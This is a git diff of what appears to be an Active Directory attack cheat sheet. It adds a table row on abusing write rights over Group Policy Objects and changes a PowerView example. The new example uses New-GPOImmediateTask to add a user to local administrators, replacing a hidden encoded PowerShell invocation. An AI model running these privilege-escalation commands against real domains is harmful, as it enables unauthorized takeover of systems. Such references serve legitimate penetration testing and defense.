@@ -77,6 +77,7 @@ ACL/ACE | Object | Permission | Abuse | ScreenShot
 **GenericWrite/WriteProperty** | User | Write/update object's attributes | [Targeted Kerberoast](#targeted-kerberoast), [Overwrite Logon Script](#overwrite-logon-script) | ![](./src/images/GenericWrite.PNG)
 **GenericWrite** | Group | ability to self add to group | [Self add to group](#add-users-to-group) | ![](./src/images/GenericWrite_Group.PNG)
 **GenericWrite/WriteProperty** | Computer | Write/update object's attributes | [RBCD](#resource-based-constrained-delegation) |
+**GenericWrite/AllExtendedWrite/GenericAll** | GPO | Write object's properties | [Add self to local admin](#abuse-weak-gpo-with-powerview) |
 **WriteDACL** | Domain | modify object's ACE (full control) | [Give owned users DCsync Privilege](#add-dcsync-to-object) | 
 **WriteOwner** | User  | change owner/password | [Change user's password with credential](#change-password-with-credential) |
 **Self-Membership/Self** | Group | ability to add ourself to the group | [Self add to group](#add-users-to-group) | 
@@ -261,7 +262,7 @@ Get-DomainGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name | ? {$_.ActiveDirect
 ### GPO Abuse with PowerView
 ```
 # Execute specific tasks
-New-GPOImmediateTask -TaskName Debugging -GPODisplayName VulnGPO -CommandArguments '-NoP -NonI -W Hidden -Enc AAAAAAA...' -Force
+New-GPOImmediateTask -TaskName Debugging -GPODisplayName VulnGPO -CommandArguments 'net.exe localgroup administrators dummyuser /add' -Force
 
 # update GPO (must run)
 gpoupdate /force
